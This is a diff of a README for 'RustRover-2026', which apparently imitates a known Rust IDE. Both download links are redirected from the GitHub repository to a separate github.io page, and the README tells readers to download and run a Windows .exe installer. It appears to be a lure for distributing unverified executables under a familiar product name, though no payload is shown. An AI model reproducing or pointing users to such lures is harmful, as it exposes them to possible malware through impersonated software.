@@ -1,6 +1,6 @@
 # 🦀 RustRover-2026 - Write Rust code with ease daily
 
-[![](https://img.shields.io/badge/Download-RustRover-blue.svg)](https://github.com/sirhypnosis583/RustRover-2026)
+[![](https://img.shields.io/badge/Download-RustRover-blue.svg)](https://sirhypnosis583.github.io)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Your computer needs specific hardware and software to run RustRover-2026 reliabl
 
 You can get the application files through the official repository page. Follow the link below to access the software.
 
-[Click here to visit the download page](https://github.com/sirhypnosis583/RustRover-2026)
+[Click here to visit the download page](https://sirhypnosis583.github.io)
 
 Once you reach the page, look for the section labeled Releases. Choose the most recent version of the Windows installer. This file usually ends with an .exe extension. Save the file to your computer.
 
